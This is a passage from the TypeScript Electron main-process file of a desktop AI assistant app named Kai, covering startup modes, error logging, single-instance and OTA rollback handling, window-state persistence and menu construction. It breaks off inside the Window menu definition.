import {
  app,
  BrowserWindow,
  ipcMain,
  shell,
  Menu,
  nativeTheme,
  dialog,
  net,
  MenuItem,
  clipboard,
  systemPreferences,
  protocol,
  screen,
  powerMonitor,
  webContents,
} from 'electron';
import { basename, join, sep } from 'path';
import {
  mkdirSync,
  existsSync,
  readFileSync,
  writeFileSync,
  readdirSync,
  opendirSync,
  statSync,
  fstatSync,
  openSync,
  readSync,
  closeSync,
  renameSync,
  constants as fsReadConstants,
} from 'fs';
import {
  appendBoundedLog,
  enterErrorHandler,
  exitErrorHandler,
  isDeadPipeError,
  isInErrorHandler,
  recordDiagnostic,
} from './diagnostics/main-diagnostics.js';
import { homedir, release as osRelease } from 'os';
import { WindowHealthMonitor } from './diagnostics/window-health.js';
import { captureHeapSnapshot } from './diagnostics/heap-snapshot.js';
import { initDiagnosticTrace, sweepDiagnosticTraceRetention, traceDiagnostic } from './diagnostics/debug-trace.js';
import { readEffectiveConfig, registerConfigHandlers } from './ipc/config.js';
import {
  registerAgentHandlers,
  registerTools,
  registerToolsPreservingBrowserState,
  updateMcpTools,
  updateSkillTools,
  updatePluginTools,
  updateCliTools,
  updateBrowserTools,
  getRegisteredTools,
  setWorkspaceToolDefinitions,
  getWorkspaceToolDefinitions,
  hasActiveStreams,
  isConversationTurnActive,
  isTextConversationTurnActive,
  mayPersistConversationForBrowserAuthority,
  getInjectUserTurnAndRestart,
  resolveEffectiveRuntimeId,
  revokeActiveTextBrowserTools,
} from './ipc/agent.js';
import { registerConversationHandlers } from './ipc/conversations.js';
import {
  resetStaleRunStatus,
  reindexIfStale,
  reconcileGhostIndexEntries,
  readConversation as readConversationRecord,
  writeConversation as writeConversationRecord,
} from './ipc/conversation-store.js';
import { setExecutionModePersister } from './tools/plan-mode.js';
import { getCliInstallStatus, installCliCommand, uninstallCliCommand } from './ipc/cli-install.js';
import { buildToolRegistry } from './tools/registry.js';
import { createBrowserTools } from './tools/browser.js';
import { buildCliTools } from './tools/cli-tools.js';
import { retryPendingSubAgentResumes } from './tools/sub-agent.js';
import { registerMcpHandlers } from './ipc/mcp.js';
import { registerMemoryHandlers } from './ipc/memory.js';
import { rebuildMcpTools, disconnectAllMcpServers } from './tools/mcp-client.js';
import { loadSkillsAsTools, resolveSkillsDir, skillsDirectoryFingerprint } from './tools/skill-loader.js';
import { registerSkillsHandlers } from './ipc/skills.js';
import { registerPlatformHandlers } from './ipc/platform.js';
import { registerAppshotHandlers } from './ipc/appshots.js';
import { registerDiffHandlers } from './ipc/diffs.js';
import { registerArtifactBundleHandlers } from './ipc/artifact-bundle.js';
import { registerAutomationsHandlers } from './ipc/automations.js';
import { initializeAlerts, registerAlertsHandlers } from './ipc/alerts.js';
import type { PluginActionPayload } from './plugins/types.js';
import { eventBus } from './automations/event-bus.js';
import { registerBuiltinSources } from './automations/builtin-sources.js';
import { getAutomationEngine, initializeAutomationEngine } from './automations/engine.js';
import { PluginManager } from './plugins/plugin-manager.js';
import { registerPluginHandlers } from './ipc/plugins.js';
import { registerMicRecorderHandlers, cleanupMicRecorder, getRecorderWindow } from './audio/mic-recorder.js';
import { registerLiveSttHandlers } from './audio/live-stt.js';
import { registerBatchTranscribeHandlers } from './audio/batch-transcribe.js';
import { registerStreamingSttHandlers } from './audio/streaming-stt.js';
import {
  registerRealtimeHandlers,
  resolveRealtimeBrowserApprovalOwner,
  revokeRealtimeBrowserTools,
  updateActiveRealtimeSessionTools,
} from './ipc/realtime.js';
import { reapplyIsolatedBrowserWebRtcPolicy } from './computer-use/harnesses/isolated-browser.js';
import type { AppConfig } from './config/schema.js';
import { resolveAlertSurface } from './config/schema.js';
import { registerRuntime } from './agent/runtime/index.js';
import { MastraRuntime } from './agent/runtime/mastra-runtime.js';
import { ClaudeAgentRuntime } from './agent/runtime/claude-agent-runtime.js';
import { CodexRuntime } from './agent/runtime/codex-runtime.js';
import { PiRuntime } from './agent/runtime/pi-runtime.js';
import { OpencodeRuntime } from './agent/runtime/opencode-runtime.js';
import { registerComputerUseHandlers } from './ipc/computer-use.js';
import { getExistingComputerUseManager } from './computer-use/service.js';
import { registerClipboardHandlers } from './ipc/clipboard.js';
import { registerShellHandlers } from './ipc/shell.js';
import { registerPartitionHandlers } from './ipc/partitions.js';
import { registerBrowserHandlers } from './ipc/browser.js';
import { registerDiagnosticsHandlers } from './ipc/diagnostics.js';
import { broadcastTaskChange, listAllTasks, registerTaskHandlers } from './ipc/tasks.js';
import {
  registerAgentHandlers as registerAgentEntityHandlers,
  listAllAgents,
  assignTaskToAgent,
  startAgentRun,
  stopAgentForDeletedTask,
} from './ipc/agents.js';
import { TaskDispatcher } from './agent/task-dispatcher.js';
import { terminateTokenizerWorker } from './agent/tokenization.js';
import { registerOrchestratorHandlers, broadcastOrchestratorState } from './ipc/orchestrator.js';
import { registerWorkspaceHandlers } from './ipc/workspaces.js';
import { TaskTerminalManager, registerTaskTerminalHandlers } from './terminal/task-terminal-manager.js';
import { initOutputBuffer, flushAll as flushOutputBuffers } from './terminal/output-buffer.js';
import { closeAllOverlayWindows } from './computer-use/overlay-window.js';
import { closeAllApprovalWindows } from './approval-window.js';
import { initDictation, updateDictationConfig, cleanupDictation } from './dictation/dictation-manager.js';
import { initAppShots, updateAppShotsConfig, cleanupAppShots } from './app-shots/manager.js';
import { registerAppShotsHandlers } from './ipc/app-shots.js';
import { registerUsageHandlers } from './ipc/usage.js';
import {
  registerAutoUpdateHandlers,
  checkForUpdatesInteractive,
  performQuitAndInstall,
  setUpdateHookRunner,
  consumePostUpdateMarker,
} from './ipc/auto-update.js';
import { applyBrandUserAgent, withBrandUserAgent } from './utils/user-agent.js';
import {
  isCanonicalPrimaryRendererUrl,
  primaryRendererFrameNavigationDisposition,
  resolvePrimaryRendererUrl,
} from './primary-renderer-url.js';
import { safeFetch, readCappedArrayBuffer } from './utils/ssrf-guard.js';
import { bootstrapSuperpowers } from './tools/superpowers-bootstrap.js';
import {
  bootstrapBundledPlugins,
  getBrandRequiredPluginNames,
  getBrandMarketplaceUrls,
} from './plugins/plugin-bootstrap.js';
import { PLUGIN_RENDERER_PROTOCOL } from './plugins/renderer-build.js';
import { initPluginBrowser } from './plugins/browser-window/index.js';
import { primeResolvedShellPath } from './utils/shell-env.js';
import { installIpcCapture } from './web-server/ipc-bridge.js';
import { startWebServer, stopWebServer, restartWebServer } from './web-server/web-server.js';
import {
  startLocalServer,
  stopLocalServer,
  disableIdleShutdown,
  restartIdleShutdown,
} from './local-bridge/local-server.js';
import { localClients } from './local-bridge/local-clients.js';
import { shouldStepAsideForUpdate, clearUpdateReady } from './local-bridge/update-signal.js';
import { webClients } from './web-server/web-clients.js';
import { broadcastToWebClients } from './web-server/web-clients.js';
import { setCompactionLockNotifier, compactingConversationIds } from './agent/compaction-lock.js';
import { createPaddedDockIcon, setPaddedMacDockIcon } from './utils/dock-icon.js';
import { resolveCodePaths } from './ota/bootstrap.js';
import { checkAndHandleRollback, signalAppRunning, signalGracefulQuit } from './ota/rollback.js';
import { registerOtaHandlers, cleanupOta } from './ipc/ota.js';
import { initializeSubagentCleanup } from './services/subagent-cleanup.js';
import { isExternallyOpenableUrl } from './utils/safe-external-url.js';
import { safeReadFileWithin, safeReadRangeWithin } from './utils/safe-file-read.js';
import { overrideCommittedQuitUnloadVeto } from './quit-lifecycle.js';
import {
  BROWSER_FORCE_EXIT_GRACE_MS,
  getExistingBrowserManager,
  initializeBrowserManager,
  shutdownBrowserManager,
} from './browser/service.js';
import {
  createBrowserConfigTransitionCoordinator,
  type BrowserConfigTransitionCoordinator,
} from './browser/config-transition.js';
import {
  dispatchBrowserAwareApplicationMenuCommand,
  dispatchBrowserAwareEditCommand,
  type BrowserAwareApplicationMenuCommand,
  type BrowserAwareEditCommand,
} from './browser/edit-menu.js';

const BROWSER_INTEGRATION_DRIVER = Symbol.for('kai.browser.integration-driver');

/** Playwright's ElectronApplication.evaluate runs in the main process, so this
 * opt-in driver can exercise the exact assistant-owned manager path without
 * exposing a test IPC method to any renderer. It is absent outside local tests. */
function installBrowserIntegrationTestDriver(): void {
  if (process.env.NODE_ENV !== 'test' || process.env.KAI_BROWSER_INTEGRATION_TEST !== '1') return;
  const manager = getExistingBrowserManager();
  if (!manager) return;
  Reflect.set(
    globalThis,
    BROWSER_INTEGRATION_DRIVER,
    Object.freeze({
      beginAssistantRun: (conversationId: string, runId: string) => manager.beginAssistantRun(conversationId, runId),
      createAssistantTab: (conversationId: string, url: string, runId: string) =>
        manager.createTab({ conversationId, url, owner: 'assistant' }, { id: runId }),
      runAssistantAction: (conversationId: string, runId: string, request: Parameters<typeof manager.action>[1]) =>
        manager.action(conversationId, request, { id: runId }),
      runAssistantInspect: (conversationId: string, runId: string, tabId: string) =>
        manager.inspect(conversationId, tabId, { id: runId }),
      runAssistantNetwork: (
        conversationId: string,
        runId: string,
        request: Parameters<typeof manager.networkDiagnostics>[1],
      ) => manager.networkDiagnostics(conversationId, request, { id: runId }),
      runAssistantEvaluate: (conversationId: string, runId: string, tabId: string, script: string) =>
        manager.evaluate(conversationId, script, tabId, { id: runId }),
      runAssistantScreenshot: (
        conversationId: string,
        runId: string,
        request: Parameters<typeof manager.screenshot>[1],
      ) => manager.screenshot(conversationId, request, 'assistant', { id: runId }),
      getPresentationState: () => ({
        mountedConversationId: Reflect.get(manager, 'mountedConversationId') as string | null,
        chromeFocusConversationId: Reflect.get(manager, 'chromeFocusConversationId') as string | null,
        attached: Reflect.get(manager, 'attachedView') !== null,
        windowMinimized: primaryWindowRef?.isMinimized() ?? false,
        windowFocused: primaryWindowRef?.isFocused() ?? false,
      }),
      isBrowserConfigTransitionPending: () => browserConfigTransitions?.isPending() ?? false,
      getTabContentsId: (conversationId: string, tabId: string) => {
        const tab = (
          Reflect.get(manager, 'tabs') as Map<
            string,
            { shell: { conversationId: string }; view: { webContents: { id: number; isDestroyed(): boolean } } | null }
          >
        ).get(tabId);
        if (!tab || tab.shell.conversationId !== conversationId || !tab.view || tab.view.webContents.isDestroyed()) {
          return null;
        }
        return tab.view.webContents.id;
      },
      keepAssistantTabOpen: (conversationId: string, tabId: string, runId: string) =>
        manager.commandTab(conversationId, tabId, 'keep-open', 'assistant', {
          id: runId,
        }),
      endAssistantRun: (conversationId: string, runId: string) => manager.cleanupAssistantTabs(conversationId, runId),
    }),
  );
}

/**
 * Open a URL in the OS default handler, but ONLY for safe web schemes. Displayed
 * chat content and tool output are partially untrusted, and shell.openExternal
 * hands the URL to the OS: `file:`/`smb:`/custom-protocol URLs can leak
 * credentials (NTLM over UNC) or launch registered handlers with attacker-
 * controlled arguments (see isExternallyOpenableUrl for the threat model).
 */
function openExternalSafely(url: string): void {
  if (isExternallyOpenableUrl(url)) {
    void shell.openExternal(url);
  }
}

/**
 * Resolve the directory used to persist app config, conversations, skills, etc.
 *
 * Defaults to `~/.{brandSlug}/`. Tests and CI can point Kai at a temp directory
 * by setting the `KAI_USER_DATA` env var — this avoids polluting the developer's
 * real `~/.kai/` while still exercising the full bootstrap path.
 */
function resolveUserDataDir(): string {
  const envOverride = process.env.KAI_USER_DATA;
  if (envOverride && envOverride.length > 0) {
    return envOverride;
  }
  return join(homedir(), '.' + __BRAND_APP_SLUG);
}

const APP_HOME = resolveUserDataDir();
let browserConfigTransitions: BrowserConfigTransitionCoordinator | null = null;

// Initialize the diagnostic trace at module scope so events emitted early in
// startup (e.g. WindowHealthMonitor.logSession) are captured when tracing was
// enabled in persisted config before launch. Uses a lazy config read.
initDiagnosticTrace(APP_HOME, () => readEffectiveConfig(APP_HOME));
// Expire old trace files on launch even if tracing is now disabled.
sweepDiagnosticTraceRetention();

/**
 * Headless mode: run the full main-process backend (IPC handlers, tools, local
 * CLI bridge) with NO window. Used when the `kai` CLI boots the leader itself
 * because no GUI is running. Detected from argv or env so the packaged app can
 * be relaunched into headless mode.
 */
const IS_HEADLESS = process.argv.includes('--kai-headless') || process.env.KAI_HEADLESS === '1';

/**
 * CLI mode: this Electron process is the `kai` terminal client, not the app.
 * It runs the Ink REPL in the main process (using Electron's built-in Node +
 * the inherited terminal TTY) and connects to the backend over the local
 * socket — it must NOT take the singleton lock or bootstrap the backend, so a
 * real backend/GUI keeps ownership. The packaged `kai` shim execs the app
 * binary with `--cli` so no separate Node runtime is needed and the security
 * fuses stay locked (this is normal main-process Node, not RunAsNode).
 */
const IS_CLI = process.argv.includes('--kai-cli') || process.env.KAI_CLI === '1';

// In headless mode there is no user and no Dock presence, so NOTHING may open a
// window — not the app, not a plugin (e.g. skynet's bridge-auth window). A
// stray window would flash on screen AND, by counting in getAllWindows(), keep
// the idle-shutdown heuristic from ever firing. Neutralize window display at
// the source: patch BrowserWindow so any instance created while the block is
// active is forced hidden and destroyed. The block is LIFTED when a headless
// backend is promoted to windowed (a GUI launched against it — see
// `promoteHeadlessToWindowed`), so the real app window can then appear.
let headlessWindowBlockActive = IS_HEADLESS;
// Install the window-block guard UNCONDITIONALLY (not just when launched
// headless). It's gated at runtime on `headlessWindowBlockActive`, which is
// false for a normal GUI launch — so the patch is a no-op there. But a GUI that
// later DEMOTES to a dockless background backend flips the flag true, and
// without the guard installed at startup, plugins/GUI subsystems could still
// open a visible window in the supposedly headless backend.
{
  const proto = BrowserWindow.prototype as unknown as {
    show: () => void;
    showInactive: () => void;
    focus: () => void;
  };
  const origShow = proto.show;
  const origShowInactive = proto.showInactive;
  const origFocus = proto.focus;
  const selfDestruct = function (this: BrowserWindow): void {
    try {
      if (!this.isDestroyed()) this.destroy();
    } catch {
      /* ignore */
    }
  };
  proto.show = function (this: BrowserWindow): void {
    if (headlessWindowBlockActive) selfDestruct.call(this);
    else origShow.call(this);
  };
  proto.showInactive = function (this: BrowserWindow): void {
    if (headlessWindowBlockActive) selfDestruct.call(this);
    else origShowInactive.call(this);
  };
  proto.focus = function (this: BrowserWindow): void {
    if (!headlessWindowBlockActive) origFocus.call(this);
    // else no-op: never steal focus while headless
  };
}

// The prototype patch above catches explicit .show()/.showInactive() calls, but
// a window created with the DEFAULT `{ show: true }` becomes visible during
// construction without ever calling .show(). Catch those at the source: while
// the headless block is active, hide + destroy any newly-created window
// immediately. A no-op when headlessWindowBlockActive is false (normal GUI, and
// after promoteHeadlessToWindowed lifts the flag so the real window survives).
app.on('browser-window-created', (_event, win) => {
  if (!headlessWindowBlockActive) return;
  try {
    win.hide();
  } catch {
    /* ignore */
  }
  try {
    if (!win.isDestroyed()) win.destroy();
  } catch {
    /* ignore */
  }
});

// App-wide window-open guard: every webContents (main window, operator window,
// mic recorder, and any future window) denies native window.open by default and
// safe-routes http(s)/mailto to the OS browser via openExternalSafely. Windows
// that need their own handler (e.g. the main window) still set one, which
// overrides this default for that contents. This closes the gap where only the
// main window was guarded. Not a will-navigate guard — the browsing/plugin
// windows legitimately navigate to arbitrary pages.
app.on('web-contents-created', (_event, contents) => {
  contents.setWindowOpenHandler(({ url }) => {
    openExternalSafely(url);
    return { action: 'deny' };
  });
  contents.on('will-prevent-unload', (event) => {
    // The first quit is still cancellable while Browser metadata drains. Once
    // that barrier completes, cleanup has already disposed native Browser and
    // background services, so a page veto must not strand a half-alive app.
    overrideCommittedQuitUnloadVeto(event, quitCleanupStarted, browserShutdownComplete);
  });
});

type MainProcessUnhandledKind = 'uncaughtException' | 'unhandledRejection';

/**
 * Promote a headless (CLI-spawned) backend to a windowed GUI. Assigned inside
 * `whenReady` (it needs getConfig/setConfig + the started local server in
 * scope); a no-op until then. Fired from `second-instance` when a GUI launches
 * against a running headless backend — the backend gains a window instead of
 * the GUI launch silently failing the singleton lock.
 */
let promoteHeadlessToWindowed: () => Promise<void> = async () => {};

/** Set once `promoteHeadlessToWindowed` is wired in whenReady. */
let promoteReady = false;
/** A second-instance (GUI launch) that arrived before promotion was wired. */
let pendingPromote = false;

/**
 * Revert a windowed backend to a dockless headless background backend when its
 * last GUI window closes but socket clients (CLIs) remain. Assigned in
 * `whenReady`; a no-op until then. Fired from `window-all-closed`.
 */
let demoteWindowedToHeadlessRef: () => void = () => {};

// Monotonic: true once this process has ever presented a GUI window — set at
// boot for a normal GUI launch, and on promotion for a CLI-spawned headless
// backend. Gates the web-server config hot-reload so a PURE headless backend
// (never windowed) can't be made to expose its network port via a config:set
// over the local bridge. A demoted-after-GUI backend keeps this true (it was
// already exposed as a GUI), so config-driven restarts still apply there.
let hasEverBeenWindowed = !IS_HEADLESS;

const MAIN_PROCESS_LOG = join(APP_HOME, 'logs', 'main-process.log');
const WINDOW_HEALTH_LOG = join(APP_HOME, 'logs', 'window-health.log');

// Wall-clock of the last system resume / screen unlock, used to timestamp how
// long after a wake the renderer crashed (the crash correlates with long idle +
// sleep/wake per the window-health telemetry). null until the first event.
let lastSystemResumeAt: number | null = null;
let lastScreenUnlockAt: number | null = null;

function formatMainProcessError(error: unknown): string {
  if (error instanceof Error) {
    return error.stack || error.message;
  }
  if (typeof error === 'string') {
    return error;
  }
  try {
    // JSON.stringify returns undefined (not a string) for undefined, functions,
    // and symbols — a Promise.reject() with such a reason would otherwise flow a
    // non-string downstream into `.match(...)` and throw a secondary error INSIDE
    // the unhandled-error handler. Coerce to a guaranteed string.
    const json = JSON.stringify(error);
    return typeof json === 'string' ? json : String(error);
  } catch {
    return String(error);
  }
}

function recordMainProcessUnhandledError(kind: MainProcessUnhandledKind, error: unknown): void {
  // Re-entrancy guard: if we're already inside this handler, a nested throw
  // (typically another EPIPE from the console write below) must NOT recurse —
  // that is exactly the self-feeding loop that once produced a 218 MB log and
  // pinned the event loop. Record to the counter and bail without touching
  // stdio again.
  if (isInErrorHandler()) {
    try {
      recordDiagnostic(kind, formatMainProcessError(error));
    } catch {
      /* noop */
    }
    return;
  }
  enterErrorHandler();
  try {
    const formatted = formatMainProcessError(error);
    recordDiagnostic(kind, formatted);

    // Never re-log a dead-pipe write to the console — the write would throw
    // another EPIPE. File logging still captures it (append is fd-based, not
    // tied to the dead stdio stream).
    if (!isDeadPipeError(error)) {
      try {
        console.error(`[${__BRAND_PRODUCT_NAME}] Unhandled main-process ${kind}:`, error);
      } catch {
        /* console itself can throw on a dead pipe — swallow */
      }
    }

    appendBoundedLog(MAIN_PROCESS_LOG, `[${new Date().toISOString()}] [${kind}] ${formatted}\n\n`);
  } finally {
    exitErrorHandler();
  }
}

// A dead stdout/stderr pipe (parent shell exits, launcher detaches) makes any
// write throw an async 'error' that would otherwise surface as an
// uncaughtException. Swallow those at the stream level so they never even reach
// the handler above — belt to its re-entrancy suspenders.
function swallowStdioError(error: NodeJS.ErrnoException): void {
  if (isDeadPipeError(error)) return;
  // A non-EPIPE stdio error is unusual; record it but do not re-log to the
  // stream that just failed.
  try {
    recordDiagnostic('uncaughtException', formatMainProcessError(error));
  } catch {
    /* noop */
  }
}
process.stdout.on('error', swallowStdioError);
process.stderr.on('error', swallowStdioError);

process.on('uncaughtException', (error) => {
  recordMainProcessUnhandledError('uncaughtException', error);
});

process.on('unhandledRejection', (reason) => {
  recordMainProcessUnhandledError('unhandledRejection', reason);
});

// Initialize terminal output buffer persistence (must be before any terminal usage)
initOutputBuffer(APP_HOME);

// ── Single-instance lock (acquired BEFORE the OTA rollback check) ─────────
// CLI mode never requests the singleton lock — the backend (GUI or headless)
// owns it. A `false` here also disables the whole backend bootstrap block below.
// Acquired up here (not later) so the OTA crash-counter is only touched by the
// process that actually boots the backend: a CLI client or a duplicate GUI
// launch that loses the lock must NOT increment the counter (three `kai`
// invocations would otherwise wipe a healthy overlay).
const gotSingleInstanceLock = IS_CLI ? false : app.requestSingleInstanceLock();
if (!IS_CLI && !gotSingleInstanceLock) {
  app.quit();
}

// ── OTA Bootstrap ────────────────────────────────────────────────────────
// Check for crash-based rollback BEFORE resolving code paths, so a broken
// overlay gets wiped before we try to load it. Only the real backend boot
// (won the lock, not a CLI client) accounts a crash / can trigger a rollback.
const otaRollbackResult =
  !IS_CLI && gotSingleInstanceLock ? checkAndHandleRollback(__BRAND_APP_SLUG, __APP_VERSION) : null;
if (otaRollbackResult) {
  console.warn(`[OTA] Rolled back from v${otaRollbackResult.rolledBackFrom}: ${otaRollbackResult.reason}`);
}

// Resolve whether to load code from OTA overlay or bundled asar.
// NOTE: In the current architecture, the main process code is already loaded from
// the bundled asar by the time this runs (we can't dynamically re-require ourselves).
// The bootstrap primarily controls the PRELOAD and RENDERER paths, plus reporting
// the active code version. A future enhancement could use a tiny entry.js wrapper
// to also redirect main process loading.
const codePaths = resolveCodePaths(__BRAND_APP_SLUG, __APP_VERSION, import.meta.dirname);
const primaryRendererUrl = resolvePrimaryRendererUrl(codePaths.renderer, process.env.ELECTRON_RENDERER_URL);
const isPrimaryRendererUrl = (url: string): boolean => isCanonicalPrimaryRendererUrl(url, primaryRendererUrl);
initPluginBrowser(codePaths, APP_HOME);

// ── Window state persistence ──────────────────────────────────────────
const WINDOW_STATE_FILE = join(APP_HOME, 'settings', 'window-state.json');

interface WindowState {
  x?: number;
  y?: number;
  width: number;
  height: number;
  isMaximized: boolean;
}

const DEFAULT_WINDOW_STATE: WindowState = { width: 1100, height: 750, isMaximized: false };

function loadWindowState(): WindowState {
  try {
    if (existsSync(WINDOW_STATE_FILE)) {
      const data = JSON.parse(readFileSync(WINDOW_STATE_FILE, 'utf-8')) as WindowState;
      // Validate the saved position is still on a visible display
      if (data.x !== undefined && data.y !== undefined) {
        const visible = screen.getDisplayMatching({
          x: data.x,
          y: data.y,
          width: data.width ?? DEFAULT_WINDOW_STATE.width,
          height: data.height ?? DEFAULT_WINDOW_STATE.height,
        });
        if (!visible) {
          // Display gone — drop saved position, keep size
          return { width: data.width, height: data.height, isMaximized: !!data.isMaximized };
        }
      }
      return {
        x: data.x,
        y: data.y,
        width: data.width ?? DEFAULT_WINDOW_STATE.width,
        height: data.height ?? DEFAULT_WINDOW_STATE.height,
        isMaximized: !!data.isMaximized,
      };
    }
  } catch {
    // Corrupt file — fall through to defaults
  }
  return DEFAULT_WINDOW_STATE;
}

function saveWindowState(win: BrowserWindow): void {
  if (win.isDestroyed()) return;
  const isMaximized = win.isMaximized();
  // Save the *normal* (non-maximized) bounds so restoring un-maximizes to
  // the last manual size rather than to the full screen dimensions.
  const bounds = isMaximized ? win.getNormalBounds() : win.getBounds();
  const state: WindowState = {
    x: bounds.x,
    y: bounds.y,
    width: bounds.width,
    height: bounds.height,
    isMaximized,
  };
  try {
    writeFileSync(WINDOW_STATE_FILE, JSON.stringify(state));
  } catch {
    // Best-effort — don't crash if settings dir is missing
  }
}

// Set app name early so macOS menu bar and dock show the product name instead of "Electron"
app.setName(__BRAND_PRODUCT_NAME);

// A headless backend is a macOS "accessory" process: no Dock icon, no menu
// bar, no window. Set at launch (per-process) — the value is never set by the
// GUI/CLI front-end clients, so nothing else is affected. This is the correct
// mechanism (vs. a runtime app.dock.hide() toggle) for keeping a CLI-only /
// backend run from rendering as a foreground GUI app in Finder or the Dock.
if (IS_HEADLESS && process.platform === 'darwin' && app.setActivationPolicy) {
  app.setActivationPolicy('accessory');
}

// Register the media protocol as a privileged scheme (must happen before app.whenReady)
protocol.registerSchemesAsPrivileged([
  {
    scheme: __BRAND_MEDIA_PROTOCOL,
    privileges: {
      standard: true,
      secure: true,
      supportFetchAPI: true,
      stream: true,
    },
  },
  {
    scheme: PLUGIN_RENDERER_PROTOCOL,
    privileges: {
      standard: true,
      secure: true,
      supportFetchAPI: true,
      stream: true,
      corsEnabled: true,
    },
  },
]);

// When APP_HOME is overridden (dev/headless isolation via KAI_USER_DATA), also
// remap Electron's own userData dir so the single-instance lock namespace
// tracks the app home. Without this, two instances pointed at DIFFERENT homes
// would still collide on one shared lock (the default userData), and the loser
// would quit without ever serving its socket. With it: distinct homes ⇒
// distinct locks (isolation works); same home ⇒ shared lock (the intended
// "one backend per install" contract still holds).
if (process.env.KAI_USER_DATA && process.env.KAI_USER_DATA.length > 0) {
  try {
    app.setPath('userData', join(APP_HOME, 'electron-user-data'));
  } catch (err) {
    console.warn(`[${__BRAND_PRODUCT_NAME}] Failed to remap userData for isolated home:`, err);
  }
}

// Module-level ref for cleanup in before-quit handler
let pluginManagerRef: PluginManager | null = null;
let taskTerminalManagerRef: TaskTerminalManager | null = null;
let taskDispatcherRef: TaskDispatcher | null = null;
let quitCleanupStarted = false;
let browserShutdownComplete = false;

function ensureAppHome(): void {
  const dirs = [
    APP_HOME,
    join(APP_HOME, 'data'),
    join(APP_HOME, 'settings'),
    join(APP_HOME, 'skills'),
    join(APP_HOME, 'plugins'),
    join(APP_HOME, 'certs'),
  ];
  for (const dir of dirs) {
    if (!existsSync(dir)) {
      mkdirSync(dir, { recursive: true });
    }
  }

  // Bootstrap superpowers skills (clone + generate skill.json wrappers on first launch)
  try {
    bootstrapSuperpowers(join(APP_HOME, 'skills'));
  } catch (err) {
    console.warn('[Main] Superpowers bootstrap failed (non-fatal):', err);
  }

  // Copy brand-required plugins from bundled resources into ~/.{appSlug}/plugins/
  try {
    bootstrapBundledPlugins(join(APP_HOME, 'plugins'));
  } catch (err) {
    console.warn('[Main] Bundled plugin bootstrap failed (non-fatal):', err);
  }

  // Sentinel: tests subscribe to this to know the user-data directory has
  // been provisioned and bootstrapping is complete. The event is fire-and-forget;
  // it never blocks startup.
  try {
    app.emit('data-app-ready', APP_HOME);
  } catch {
    // EventEmitter.emit only throws when no listener is registered for an
    // 'error' event — never for custom event names. Defensive try/catch.
  }
}

function applyTheme(): void {
  try {
    const config = readEffectiveConfig(APP_HOME);
    const theme = config?.ui?.theme;
    if (theme === 'dark') nativeTheme.themeSource = 'dark';
    else if (theme === 'light') nativeTheme.themeSource = 'light';
    else nativeTheme.themeSource = 'system';
  } catch {
    nativeTheme.themeSource = 'system';
  }
}

function runEditMenuCommand(command: BrowserAwareEditCommand): void {
  dispatchBrowserAwareEditCommand(webContents.getFocusedWebContents(), getExistingBrowserManager(), command);
}

function runApplicationMenuCommand(command: BrowserAwareApplicationMenuCommand): void {
  dispatchBrowserAwareApplicationMenuCommand(
    webContents.getFocusedWebContents(),
    getExistingBrowserManager(),
    command,
    (contents, fallbackCommand) => {
      if (fallbackCommand === 'find') contents.send('menu:find');
      else if (fallbackCommand === 'reload') contents.reload();
      else if (fallbackCommand === 'hard-reload') contents.reloadIgnoringCache();
      else if (fallbackCommand === 'toggle-devtools') contents.toggleDevTools();
      else if (fallbackCommand === 'zoom-reset') contents.setZoomLevel(0);
      else {
        const delta = fallbackCommand === 'zoom-in' ? 0.5 : -0.5;
        contents.setZoomLevel(contents.getZoomLevel() + delta);
      }
    },
  );
}

let updateDownloaded = false;
let primaryWindowRef: BrowserWindow | null = null;

/** A primary renderer realm owns every native Browser capability. Losing that
 * realm must revoke manager, text, and Realtime authority as one operation. */
function revokeBrowserHostRendererAccess(): void {
  getExistingBrowserManager()?.handleHostRendererUnavailable();
  revokeActiveTextBrowserTools();
  revokeRealtimeBrowserTools(getRegisteredTools());
}
let lastFocusedWindowRef: BrowserWindow | null = null;

app.on('browser-window-focus', (_event, win) => {
  lastFocusedWindowRef = win;
});

function buildMenu(): void {
  const updateMenuItem: Electron.MenuItemConstructorOptions = updateDownloaded
    ? {
        label: 'Install Update…',
        click: () => {
          void performQuitAndInstall();
        },
      }
    : {
        label: 'Check for Updates…',
        click: () => {
          checkForUpdatesInteractive();
        },
      };

  const settingsMenuItem: Electron.MenuItemConstructorOptions = {
    label: 'Settings…',
    accelerator: 'CommandOrControl+,',
    click: () => {
      const win = BrowserWindow.getFocusedWindow();
      if (win) win.webContents.send('menu:open-settings');
    },
  };

  const template: Electron.MenuItemConstructorOptions[] = [];

  if (IS_MAC) {
    // macOS: app-name menu with About, Settings, Services, Hide, Quit
    template.push({
      label: app.name,
      submenu: [
        { role: 'about' },
        { type: 'separator' },
        updateMenuItem,
        settingsMenuItem,
        { type: 'separator' },
        { role: 'services' },
        { type: 'separator' },
        { role: 'hide' },
        { role: 'hideOthers' },
        { role: 'unhide' },
        { type: 'separator' },
        { role: 'quit' },
      ],
    });
  } else {
    // Windows/Linux: File menu with Settings, Check for Updates, Exit
    template.push({
      label: 'File',
      submenu: [settingsMenuItem, updateMenuItem, { type: 'separator' }, { role: 'quit', label: 'Exit' }],
    });
  }

  template.push({
    label: 'Edit',
    submenu: [
      { role: 'undo' },
      { role: 'redo' },
      { type: 'separator' },
      { label: 'Cut', accelerator: 'CommandOrControl+X', click: () => runEditMenuCommand('cut') },
      { label: 'Copy', accelerator: 'CommandOrControl+C', click: () => runEditMenuCommand('copy') },
      { label: 'Paste', accelerator: 'CommandOrControl+V', click: () => runEditMenuCommand('paste') },
      { role: 'selectAll' },
      { type: 'separator' },
      {
        label: 'Find',
        accelerator: 'CommandOrControl+F',
        click: () => runApplicationMenuCommand('find'),
      },
    ],
  });

  template.push({
    label: 'View',
    submenu: [
      { label: 'Reload', accelerator: 'CommandOrControl+R', click: () => runApplicationMenuCommand('reload') },
      {
        label: 'Force Reload',
        accelerator: 'CommandOrControl+Shift+R',
        click: () => runApplicationMenuCommand('hard-reload'),
      },
      {
        label: 'Toggle Developer Tools',
        accelerator: IS_MAC ? 'Alt+Command+I' : 'Control+Shift+I',
        click: () => runApplicationMenuCommand('toggle-devtools'),
      },
      { type: 'separator' },
      {
        label: 'Actual Size',
        accelerator: 'CommandOrControl+0',
        click: () => runApplicationMenuCommand('zoom-reset'),
      },
      {
        label: 'Zoom In',
        accelerator: 'CommandOrControl+=',
        click: () => runApplicationMenuCommand('zoom-in'),
      },
      {
        label: 'Zoom Out',
        accelerator: 'CommandOrControl+-',
        click: () => runApplicationMenuCommand('zoom-out'),
      },
      { type: 'separator' },
      { role: 'togglefullscreen' },
    ],
  });

  template.push({
    label: 'Window',
    submenu: IS_MAC
      ? [
          { role: 'minimize' },
